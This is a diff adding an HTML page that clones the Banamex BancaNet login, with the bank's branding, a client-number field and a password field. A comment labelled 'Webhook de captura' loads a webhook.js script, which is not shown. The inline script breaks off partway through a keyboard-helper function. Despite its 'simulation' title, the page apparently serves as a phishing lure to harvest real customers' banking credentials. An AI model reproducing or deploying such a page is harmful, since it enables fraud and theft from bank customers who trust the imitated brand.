@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banamex | BancaNet - Simulación de Login</title>
+    <style>
+        /* Reset y estilos base */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #111827;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ================= BARRA SUPERIOR (TOP BAR) ================= */
+        .top-utility-bar {
+            background-color: #033540;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 8px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        .top-bar-inner {
+            max-width: 1140px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .live-clock {
+            letter-spacing: 0.2px;
+            font-weight: 500;
+        }
+
+        .top-links {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .top-links a {
+            color: #ffffff;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            transition: opacity 0.2s;
+        }
+
+        .top-links a:hover {
+            opacity: 0.8;
+        }
+
+        .top-links .divider {
+            color: rgba(255, 255, 255, 0.35);
+            font-weight: 300;
+        }
+
+        /* ================= CONTENEDOR PRINCIPAL ================= */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 28px 16px 64px 16px;
+        }
+
+        .hero-frame {
+            background-color: #033540;
+            width: 100%;
+            max-width: 1140px;
+            border-radius: 24px;
+            padding: 24px 36px 36px 36px;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            min-height: 540px;
+        }
+
+        /* Muesca superior izquierda para el logo */
+        .header-cutout {
+            position: absolute;
+            top: 0;
+            left: 0;
+            background-color: #ffffff;
+            width: 340px;
+            height: 60px;
+            border-bottom-right-radius: 26px;
+            display: flex;
+            align-items: center;
+            padding-left: 12px;
+            z-index: 4;
+        }
+
+        .header-cutout::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            right: -24px;
+            width: 24px;
+            height: 24px;
+            background: radial-gradient(circle at 100% 100%, transparent 24px, #ffffff 25px);
+        }
+
+        .header-cutout::before {
+            content: "";
+            position: absolute;
+            bottom: -24px;
+            left: 0;
+            width: 24px;
+            height: 24px;
+            background: radial-gradient(circle at 100% 100%, transparent 24px, #ffffff 25px);
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand-name {
+            color: #033540;
+            font-weight: 700;
+            font-size: 22px;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-divider {
+            width: 1.5px;
+            height: 24px;
+            background-color: #033540;
+            margin: 0 2px;
+        }
+
+        .brand-sub {
+            color: #033540;
+            font-weight: 400;
+            font-size: 17px;
+        }
+
+        .brand-sub sup {
+            font-size: 9px;
+        }
+
+        /* ================= TARJETA BLANCA DE LOGIN ================= */
+        .login-card {
+            background-color: #ffffff;
+            border-radius: 20px;
+            padding: 26px 26px 30px 26px;
+            margin-top: 52px;
+            width: 100%;
+            max-width: 340px;
+            position: relative;
+            z-index: 3;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+        }
+
+        .login-title {
+            color: #ff1e42;
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .input-label {
+            display: block;
+            color: #111827;
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .help-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 16px;
+            height: 16px;
+            border: 1px solid #007a99;
+            border-radius: 4px;
+            color: #007a99;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            vertical-align: middle;
+            margin-left: 4px;
+            position: relative;
+            user-select: none;
+            transition: background-color 0.2s;
+        }
+
+        .help-icon:hover {
+            background-color: #e6f4f8;
+        }
+
+        .tooltip-text {
+            visibility: hidden;
+            width: 210px;
+            background-color: #033540;
+            color: #fff;
+            text-align: left;
+            font-weight: 400;
+            font-size: 12px;
+            border-radius: 8px;
+            padding: 8px 10px;
+            position: absolute;
+            z-index: 20;
+            bottom: 135%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            line-height: 1.3;
+        }
+
+        .help-icon.active .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #033540;
+            border-radius: 10px;
+            padding: 0 14px;
+            font-size: 15px;
+            color: #111827;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #007a99;
+            box-shadow: 0 0 0 2px rgba(0, 122, 153, 0.18);
+        }
+
+        .form-input.error {
+            border-color: #ff1e42;
+        }
+
+        .error-msg {
+            color: #ff1e42;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .user-summary {
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #f3f6f8;
+            border-radius: 8px;
+            padding: 8px 12px;
+            margin-bottom: 14px;
+            font-size: 12px;
+            color: #033540;
+        }
+
+        .user-summary strong {
+            font-weight: 700;
+        }
+
+        .change-user-btn {
+            background: none;
+            border: none;
+            color: #007a99;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        #passwordStep {
+            display: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-top: 12px;
+            margin-bottom: 20px;
+        }
+
+        .custom-checkbox {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border: 1.5px solid #033540;
+            border-radius: 4px;
+            margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .custom-checkbox:checked {
+            background-color: #033540;
+        }
+
+        .custom-checkbox:checked::after {
+            content: "";
+            width: 4px;
+            height: 8px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-bottom: 2px;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #111827;
+            cursor: pointer;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 44px;
+            background-color: #033540;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .btn-submit:hover {
+            background-color: #054958;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.99);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            margin-top: 14px;
+            color: #007a99;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .menu-list {
+            margin-top: 22px;
+            list-style: none;
+        }
+
+        .menu-item {
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .menu-link {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 13px 0;
+            text-decoration: none;
+            color: #111827;
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 1.35;
+            transition: color 0.2s;
+        }
+
+        .menu-link:hover {
+            color: #007a99;
+        }
+
+        .chevron-icon {
+            color: #033540;
+            flex-shrink: 0;
+            margin-left: 10px;
+        }
+
+        /* ================= CONTENIDO DERECHO DESKTOP ================= */
+        .hero-promo {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding-left: 64px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .promo-slogan {
+            color: #ffffff;
+            font-size: 40px;
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.5px;
+            max-width: 240px;
+            margin-bottom: 90px;
+            transition: opacity 0.3s ease;
+        }
+
+        .hero-rosette-graphic {
+            position: absolute;
+            right: -28px;
+            bottom: -38px;
+            width: 470px;
+            height: 470px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* ================= PAGINACIÓN ================= */
+        .carousel-dots {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 22px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #033540;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            transition: background-color 0.25s, transform 0.25s;
+        }
+
+        .dot.active {
+            background-color: #ff1e42;
+            transform: scale(1.15);
+        }
+
+        /* ================= FOOTER INFORMATIVO (NUEVAS SECCIONES) ================= */
+        .info-footer {
+            width: 100%;
+            max-width: 1140px;
+            margin-top: 38px;
+            display: flex;
+            flex-direction: column;
+            gap: 44px;
+        }
+
+        /* Sección 1: Estamos donde tú estás */
+        .locations-banner {
+            background-color: #eaf2f4;
+            border-radius: 22px;
+            padding: 32px 32px 36px 32px;
+        }
+
+        .section-heading {
+            color: #111827;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 22px;
+        }
+
+        .quick-cards-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+        }
+
+        .quick-card {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            text-decoration: none;
+            color: #111827;
+            transition: transform 0.2s ease;
+        }
+
+        .quick-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .quick-card-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            position: relative;
+            z-index: 2;
+        }
+
+        .icon-teal { background-color: #033540; }
+        .icon-purple { background-color: #a87ffb; }
+        .icon-orange { background-color: #ff8450; }
+        .icon-cyan { background-color: #218da6; }
+
+        .quick-card-body {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 54px 18px 20px 18px;
+            margin-top: -42px;
+            min-height: 112px;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+        }
+
+        .quick-card-body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 49px;
+            height: 49px;
+            background-color: #eaf2f4;
+            border-bottom-right-radius: 16px;
+            z-index: 1;
+        }
+
+        .quick-card-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111827;
+            line-height: 1.35;
+        }
+
+        .quick-card-sub {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111827;
+            margin-top: 2px;
+        }
+
+        /* Sección 2: Haz tus operaciones de forma más rápida y segura */
+        .security-section {
+            padding: 0 4px;
+        }
+
+        .promo-cards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
+        }
+
+        .promo-card {
+            background-color: #fdf4f3;
+            border-radius: 22px;
+            padding: 28px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .promo-card-icon {
+            width: 56px;
+            height: 56px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .app-icon-box {
+            width: 54px;
+            height: 54px;
+            background-color: #033540;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .promo-card-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 10px;
+        }
+
+        .promo-card-title sup {
+            font-size: 10px;
+        }
+
+        .promo-card-desc {
+            font-size: 14px;
+            color: #374151;
+            line-height: 1.45;
+            margin-bottom: 16px;
+            max-width: 440px;
+        }
+
+        .promo-inline-link {
+            color: #007a99;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        .promo-cta-link {
+            color: #007a99;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: auto;
+        }
+
+        .promo-cta-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ================= RESPONSIVE DESIGN ================= */
+        @media (max-width: 1024px) {
+            .hero-promo {
+                padding-left: 32px;
+            }
+            .promo-slogan {
+                font-size: 32px;
+            }
+            .hero-rosette-graphic {
+                width: 360px;
+                height: 360px;
+                right: -18px;
+                bottom: -24px;
+            }
+            .quick-cards-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .top-utility-bar {
+                padding: 8px 14px;
+                font-size: 10px;
+            }
+            .top-bar-inner {
+                flex-direction: column;
+                gap: 6px;
+                text-align: center;
+            }
+
+            .main-container {
+                padding: 16px 12px 42px 12px;
+            }
+
+            .hero-frame {
+                flex-direction: column;
+                align-items: center;
+                padding: 16px 20px 26px 20px;
+                min-height: auto;
+                max-width: 390px;
+            }
+
+            .header-cutout {
+                width: 68%;
+                height: 54px;
+                padding-left: 8px;
+            }
+
+            .brand-name {
+                font-size: 20px;
+            }
+
+            .brand-sub {
+                font-size: 16px;
+            }
+
+            .login-card {
+                max-width: 100%;
+                margin-top: 52px;
+                padding: 24px 20px 28px 20px;
+            }
+
+            .hero-promo,
+            .hero-rosette-graphic {
+                display: none;
+            }
+
+            .info-footer {
+                max-width: 390px;
+                margin-top: 28px;
+                gap: 28px;
+            }
+
+            .locations-banner {
+                padding: 22px 18px;
+            }
+
+            .quick-cards-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+
+            .promo-cards-grid {
+                grid-template-columns: 1fr;
+                gap: 16px;
+            }
+
+            .promo-card {
+                padding: 22px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-utility-bar">
+        <div class="top-bar-inner">
+            <div id="liveClock" class="live-clock">Sábado 21 de Noviembre de 2026, 20:54:03</div>
+            <nav class="top-links" aria-label="Enlaces de utilidad">
+                <a href="#sucursales">SUCURSALES</a>
+                <span class="divider">|</span>
+                <a href="#contactanos">
+                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                    CONTÁCTANOS
+                </a>
+                <span class="divider">|</span>
+                <a href="#ayuda">AYUDA</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="hero-frame">
+            
+            <div class="header-cutout">
+                <div class="brand-logo">
+                    <svg width="26" height="26" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16 3C18.5 3 20.5 5 20.5 7.5C20.5 8.8 19.9 10 19 10.8C20.3 10.3 21.8 10.6 22.8 11.6C24.6 13.4 24.6 16.2 22.8 18C21.9 18.9 20.7 19.4 19.5 19.3C20.3 20.4 20.5 21.9 19.8 23.2C18.5 25.4 15.8 26.1 13.6 24.8C12.5 24.2 11.8 23.1 11.5 21.9C10.8 23.1 9.5 23.8 8.1 23.8C5.6 23.8 3.6 21.8 3.6 19.3C3.6 18 4.2 16.8 5.1 16C3.8 16.5 2.3 16.2 1.3 15.2C-0.5 13.4 -0.5 10.6 1.3 8.8C2.2 7.9 3.4 7.4 4.6 7.5C3.8 6.4 3.6 4.9 4.3 3.6C5.6 1.4 8.3 0.7 10.5 2C11.6 2.6 12.3 3.7 12.6 4.9C13.3 3.7 14.6 3 16 3Z" transform="translate(2, 2) scale(0.88)" stroke="#FF1E42" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+                        <circle cx="16" cy="16" r="4.5" stroke="#FF1E42" stroke-width="2.2"/>
+                    </svg>
+                    <span class="brand-name">Banamex</span>
+                    <div class="brand-divider"></div>
+                    <span class="brand-sub">BancaNet<sup>®</sup></span>
+                </div>
+            </div>
+
+            <main class="login-card">
+                <h1 class="login-title">Iniciar sesión</h1>
+
+                <form id="loginForm" novalidate>
+                    <!-- PASO 1: Número de cliente o tarjeta -->
+                    <div id="userStep">
+                        <div class="form-group">
+                            <label for="userNumber" class="input-label">
+                                Número de cliente o tarjeta de crédito
+                                <span class="help-icon" tabindex="0" role="button" aria-label="Ayuda sobre número de cliente">?
+                                    <span class="tooltip-text">Ingresa los 8 a 10 dígitos de tu número de cliente o los 16 dígitos de tu tarjeta.</span>
+                                </span>
+                            </label>
+                            <input 
+                                type="password" 
+                                id="userNumber" 
+                                class="form-input" 
+                                maxlength="16"
+                                size="25"
+                                autocomplete="off"
+                                onkeypress="submitInEnter(event);return blockSpecialCharsAndLetters(event);"
+                                onkeyup="removeLeadingZero(event);"
+                                inputmode="numeric" 
+                            >
+                            <div id="userErrorMsg" class="error-msg">Por favor, ingresa un número válido.</div>
+                        </div>
+
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="rememberUser" class="custom-checkbox">
+                            <label for="rememberUser" class="checkbox-label">Recordar mi usuario</label>
+                            <span class="help-icon" tabindex="0" role="button" aria-label="Ayuda sobre recordar usuario">?
+                                <span class="tooltip-text">Guarda tu número de cliente en este dispositivo para futuros ingresos.</span>
+                            </span>
+                        </div>
+
+                        <button type="button" id="continueBtn" class="btn-submit">Continuar</button>
+                    </div>
+
+                    <!-- PASO 2: Contraseña -->
+                    <div id="passwordStep">
+                        <div id="userSummary" class="user-summary">
+                            <span>Usuario: <strong id="displayUser"></strong></span>
+                            <button type="button" id="changeUserBtn" class="change-user-btn">Cambiar</button>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="passwordInput" class="input-label">Contraseña</label>
+                            <input 
+                                type="password" 
+                                id="passwordInput" 
+                                class="form-input" 
+                                maxlength="8"
+                                size="25"
+                                autocomplete="off"
+                                onkeypress="identifyEscKeyPressedEvent(event);return blockSpecialChars(event);"
+                                onkeyup="tabToEnter(event);"
+                            >
+                            <div id="passErrorMsg" class="error-msg">Por favor, ingresa tu contraseña.</div>
+                        </div>
+
+                        <button type="submit" id="loginSubmitBtn" class="btn-submit">Iniciar sesión</button>
+                    </div>
+                </form>
+
+                <a href="#recuperar" class="forgot-link">Recuperar contraseña</a>
+
+                <ul class="menu-list">
+                    <li class="menu-item">
+                        <a href="#seguridad" class="menu-link">
+                            <span>Centro de Seguridad</span>
+                            <svg class="chevron-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </a>
+                    </li>
+                    <li class="menu-item">
+                        <a href="#herramienta" class="menu-link">
+                            <span>Conoce la herramienta de seguridad</span>
+                            <svg class="chevron-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </a>
+                    </li>
+                    <li class="menu-item">
+                        <a href="#instalar" class="menu-link">
+                            <span>Instalar herramienta</span>
+                            <svg class="chevron-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="9 18 15 12 9 6"></polyline>
+                            </svg>
+                        </a>
+                    </li>
+                </ul>
+            </main>
+
+            <section class="hero-promo" aria-label="Mensaje institucional">
+                <h2 id="promoSlogan" class="promo-slogan">Aquí.<br>Para ti.<br>Siempre.</h2>
+            </section>
+
+            <svg class="hero-rosette-graphic" viewBox="0 0 500 500" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <filter id="petalShadow" x="-15%" y="-15%" width="135%" height="135%">
+                        <feDropShadow dx="-6" dy="10" stdDeviation="12" flood-color="#01181e" flood-opacity="0.45"/>
+                    </filter>
+                    <linearGradient id="petalGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" stop-color="#ff2a4b"/>
+                        <stop offset="100%" stop-color="#e31233"/>
+                    </linearGradient>
+                    <g id="rosettePetal">
+                        <path d="M 0,-45 C 45,-45 125,-35 150,15 C 175,65 130,130 70,130 C 10,130 -35,70 -35,10 C -35,-25 -20,-45 0,-45 Z M 22,8 C 5,8 -5,22 2,42 C 10,65 45,82 72,74 C 98,66 105,36 88,18 C 72,2 40,8 22,8 Z" 
+                              fill="url(#petalGrad)" 
+                              fill-rule="evenodd"
+                              filter="url(#petalShadow)"/>
+                    </g>
+                </defs>
+                <g transform="translate(265, 265) rotate(-18)">
+                    <use href="#rosettePetal" transform="rotate(0) translate(32, -25)"/>
+                    <use href="#rosettePetal" transform="rotate(72) translate(32, -25)"/>
+                    <use href="#rosettePetal" transform="rotate(144) translate(32, -25)"/>
+                    <use href="#rosettePetal" transform="rotate(216) translate(32, -25)"/>
+                    <use href="#rosettePetal" transform="rotate(288) translate(32, -25)"/>
+                </g>
+            </svg>
+
+        </div>
+
+        <div class="carousel-dots" role="tablist" aria-label="Diapositivas">
+            <button class="dot active" data-slide="0" aria-label="Diapositiva 1"></button>
+            <button class="dot" data-slide="1" aria-label="Diapositiva 2"></button>
+            <button class="dot" data-slide="2" aria-label="Diapositiva 3"></button>
+            <button class="dot" data-slide="3" aria-label="Diapositiva 4"></button>
+            <button class="dot" data-slide="4" aria-label="Diapositiva 5"></button>
+        </div>
+
+        <!-- ================= FOOTER / SECCIONES DE SERVICIO ================= -->
+        <footer class="info-footer">
+            
+            <!-- Bloque 1: Estamos donde tú estás -->
+            <section class="locations-banner" aria-labelledby="heading-ubicacion">
+                <h2 id="heading-ubicacion" class="section-heading">Estamos donde tú estás</h2>
+                
+                <div class="quick-cards-grid">
+                    <a href="#cajeros" class="quick-card">
+                        <div class="quick-card-icon icon-teal">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                        </div>
+                        <div class="quick-card-body">
+                            <div class="quick-card-title">Encuentra cajeros automáticos</div>
+                        </div>
+                    </a>
+
+                    <a href="tel:5512263990" class="quick-card">
+                        <div class="quick-card-icon icon-purple">
+                            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                            </svg>
+                        </div>
+                        <div class="quick-card-body">
+                            <div class="quick-card-title">Atención telefónica</div>
+                            <div class="quick-card-sub">55 1226 3990</div>
+                        </div>
+                    </a>
+
+                    <a href="#app-banamex" class="quick-card">
+                        <div class="quick-card-icon icon-orange">
+                            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                                <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                            </svg>
+                        </div>
+                        <div class="quick-card-body">
+                            <div class="quick-card-title">Conoce App Banamex</div>
+                        </div>
+                    </a>
+
+                    <a href="#aclaraciones" class="quick-card">
+                        <div class="quick-card-icon icon-cyan">
+                            <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                <polyline points="14 2 14 8 20 8"></polyline>
+                                <line x1="8" y1="13" x2="16" y2="13"></line>
+                                <line x1="8" y1="17" x2="16" y2="17"></line>
+                            </svg>
+                        </div>
+                        <div class="quick-card-body">
+                            <div class="quick-card-title">Consulta de aclaraciones</div>
+                        </div>
+                    </a>
+                </div>
+            </section>
+
+            <!-- Bloque 2: Haz tus operaciones de forma más rápida y segura -->
+            <section class="security-section" aria-labelledby="heading-operaciones">
+                <h2 id="heading-operaciones" class="section-heading">Haz tus operaciones de forma más rápida y segura</h2>
+
+                <div class="promo-cards-grid">
+                    <article class="promo-card">
+                        <div class="promo-card-icon">
+                            <svg width="56" height="56" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M16 14L17 17L20 18L17 19L16 22L15 19L12 18L15 17L16 14Z" fill="#FF1E42"/>
+                                <path d="M48 11L49 13.5L51.5 14.5L49 15.5L48 18L47 15.5L44.5 14.5L47 13.5L48 11Z" fill="#FF1E42"/>
+                                <ellipse cx="32" cy="54" rx="16" ry="2.5" fill="#B8D4DC"/>
+                                <path d="M32 14L47 20V33C47 42.5 40.5 50 32 53C23.5 50 17 42.5 17 33V20L32 14Z" fill="#D4E8EE" stroke="#033540" stroke-width="2" stroke-linejoin="round"/>
+                                <path d="M32 14V53C40.5 50 47 42.5 47 33V20L32 14Z" fill="#B6D7E2"/>
+                                <path d="M32 14L47 20V33C47 42.5 40.5 50 32 53C23.5 50 17 42.5 17 33V20L32 14Z" stroke="#033540" stroke-width="2" stroke-linejoin="round"/>
+                                <path d="M13 33C20 38 44 38 51 33L49 41C42 45 22 45 15 41L13 33Z" fill="#FF1E42"/>
+                                <circle cx="24" cy="39.5" r="1.5" fill="#FFFFFF"/>
+                                <circle cx="32" cy="40.5" r="1.8" fill="#FFFFFF"/>
+                                <circle cx="40" cy="39.5" r="1.5" fill="#FFFFFF"/>
+                            </svg>
+                        </div>
+                        <h3 class="promo-card-title">Navega con mayor seguridad en BancaNet<sup>®</sup></h3>
+                        <p class="promo-card-desc">
+                            Descarga sin costo <a href="#trusteer" class="promo-inline-link">IBM® Security Trusteer Rapport</a> para reforzar la seguridad de tu información.
+                        </p>
+                        <a href="#conoce-mas" class="promo-cta-link">Conoce más</a>
+                    </article>
+
+                    <article class="promo-card">
+                        <div class="promo-card-icon">
+                            <div class="app-icon-box">
+                                <svg width="34" height="34" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M16 3C18.5 3 20.5 5 20.5 7.5C20.5 8.8 19.9 10 19 10.8C20.3 10.3 21.8 10.6 22.8 11.6C24.6 13.4 24.6 16.2 22.8 18C21.9 18.9 20.7 19.4 19.5 19.3C20.3 20.4 20.5 21.9 19.8 23.2C18.5 25.4 15.8 26.1 13.6 24.8C12.5 24.2 11.8 23.1 11.5 21.9C10.8 23.1 9.5 23.8 8.1 23.8C5.6 23.8 3.6 21.8 3.6 19.3C3.6 18 4.2 16.8 5.1 16C3.8 16.5 2.3 16.2 1.3 15.2C-0.5 13.4 -0.5 10.6 1.3 8.8C2.2 7.9 3.4 7.4 4.6 7.5C3.8 6.4 3.6 4.9 4.3 3.6C5.6 1.4 8.3 0.7 10.5 2C11.6 2.6 12.3 3.7 12.6 4.9C13.3 3.7 14.6 3 16 3Z" transform="translate(2, 2) scale(0.88)" stroke="#FF1E42" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                                    <circle cx="16" cy="16" r="4.5" stroke="#FF1E42" stroke-width="2.5"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <h3 class="promo-card-title">Descarga App Banamex y olvídate de las filas</h3>
+                        <p class="promo-card-desc">
+                            Descarga nuestra aplicación desde Play Store o App Store y haz tus operaciones desde donde estés.
+                        </p>
+                        <a href="#beneficios-app" class="promo-cta-link">Conoce los beneficios</a>
+                    </article>
+                </div>
+            </section>
+
+        </footer>
+    </div>
+
+    <!-- Webhook de captura -->
+    <script src="webhook.js"></script>
+
+    <script>
+        /* 0. Auxiliares de teclado usados por los atributos onkeypress / onkeyup de los inputs */
+        // Enter => envía el formulario (evita el comportamiento por defecto duplicado)
+        function submitInEnter(e) {
+            if (e.key === 'Enter' || e.keyCode === 13) {
+                e.preventDefault();
+                const f = e.target.form;
+                if (!f) return;
+                if (typeof f.requestSubmit === 'function') {
+                    f.requestSubmit();
+                } else {
+                    f.submit();
+                }
+            }
+        }
+
+        // Solo dígitos: bloquea letras y caracteres especiales
+        function blockSpecialCharsAndLetters(e) {
+            if (!e.key || e.key.length !== 1) return true; // teclas de control
+            return /^[0-9]$/.test(e.key);
+        }
+
+        // Elimina ceros a la izquierda
+        function removeLeadingZero(e) {
+            const el = e.target;
+            if (/^0+/.test(el.value)) {
+                el.value = el.value.replace(/^0+/, '');
+            }
+        }
+
+        // ESC limpia el campo; el resto de teclas se permiten
+        function identifyEscKeyPressedEvent(e) {
+            if (e.key === 'Escape' || e.keyCode === 27) {
+                e.target.value = '';
+            }
+            return true;
+        }
+
+        // Permite letras, números y !@#$%^&*._- ; bloquea espacios y el resto
+        function blockSpecialChars(e) {
+            if (!e.key || e.key.length !== 1) return true; // teclas de control
+            return /^[A-Za-z0-9!@#$%^&*._-]$/.test(e.key);
+        }
+
+        // Enter actúa como Tab: pasa el foco al siguiente campo del formulario
+        function tabToEnter(e) {
+            if (e.key !== 'Enter' && e.keyCode !== 13) return;
+            const form = e.target.form;
+            if (!form) return;
